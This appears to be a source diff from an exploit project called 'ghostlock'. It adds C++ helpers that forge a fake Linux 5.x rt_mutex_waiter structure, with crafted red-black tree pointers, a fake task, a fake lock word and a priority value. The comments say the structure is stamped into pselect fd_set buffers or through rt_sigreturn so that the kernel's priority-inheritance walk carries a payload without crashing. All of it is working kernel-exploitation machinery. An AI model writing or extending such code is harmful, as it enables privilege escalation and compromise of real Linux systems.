@@ -102,6 +102,68 @@ namespace ghostlock::memory {
     /* Fixed payload fragment sizes shared by the encoders and their callers. */
     inline constexpr std::size_t kCompactWaiterBytes = 0x30;
 
+    /* The eleven words of the 5.x `struct rt_mutex_waiter`, in address order:
+     *   +0x00 tree_entry {__rb_parent_color, rb_right, rb_left}
+     *   +0x18 pi_tree_entry {__rb_parent_color, rb_right, rb_left}
+     *   +0x30 task   +0x38 lock   +0x40 prio   +0x48 deadline   +0x50 ww_ctx
+     * Every word the PI walk loads or dereferences lives in this strip -- the
+     * walk's crash signatures name `lock` +0x38, `prio` +0x40 and `deadline`
+     * +0x48, which is why an incomplete stamp oopses rather than quietly
+     * missing. The select route's compact branch stamps exactly this list
+     * into the pselect fd_set buffer; the sigreturn route stamps it through
+     * rt_sigreturn's fpsimd copy, so both build it from this one definition. */
+    inline constexpr std::size_t kWaiterBytes = 0x58;
+    inline constexpr std::size_t kWaiterWords = kWaiterBytes / sizeof(std::uint64_t);
+
+    struct WaiterWords final {
+        std::uintptr_t tree_pc = 0;
+        std::uintptr_t tree_right = 0;
+        std::uintptr_t tree_left = 0;
+        std::uintptr_t pi_pc = 0;
+        std::uintptr_t pi_right = 0;
+        std::uintptr_t pi_left = 0;
+        std::uintptr_t task = 0;
+        std::uintptr_t lock = 0;
+        std::uint64_t prio = 0;
+        std::uint64_t deadline = 0;
+        std::uint64_t ww_ctx = 0;
+    };
+
+    /* Resolve the eleven words from the same inputs the select route stamps.
+     * The tree triple is waiter_tree_stamp(layout) -- one definition, both
+     * routes. The pi triple parks at zero: a zero pi node stays out of every
+     * erase and every descent (the payload rides the *tree* entry's erase;
+     * build N carried it on the pi entry and wrote nothing). `lock_word` is
+     * either the lock-anchor slot or the reclaimed page's fake lock, and
+     * `prio` is the value the walk compares against the fake task
+     * (`kernel::FAKE_WAITER_PRIO` on 5.x, which has no packed wake_state
+     * word -- that is the 6.6 shape). */
+    [[nodiscard]] inline WaiterWords waiter_words(
+        const PayloadWriteLayout &layout, std::uintptr_t fake_task,
+        std::uintptr_t lock_word, std::uint64_t prio) noexcept {
+        const WaiterTreeStamp stamp = waiter_tree_stamp(layout);
+        return WaiterWords{
+            .tree_pc = stamp.pc,
+            .tree_right = stamp.right,
+            .tree_left = stamp.left,
+            .pi_pc = 0,
+            .pi_right = 0,
+            .pi_left = 0,
+            .task = fake_task,
+            .lock = lock_word,
+            .prio = prio,
+            .deadline = 0,
+            .ww_ctx = 0,
+        };
+    }
+
+    /* Place the eleven words at `offset`, word i at byte `offset + 8*i`, and
+     * leave every other byte of the span untouched. Returns false without
+     * writing when the span cannot hold the whole strip. */
+    [[nodiscard]] bool encode_waiter_words(
+        std::span<std::byte> buffer, std::size_t offset,
+        const WaiterWords &words) noexcept;
+
     /* Bounds-checked encoders. They return false without modifying memory when
  * the destination cannot contain every field required by the layout. */
     [[nodiscard]] bool encode_compact_waiter(
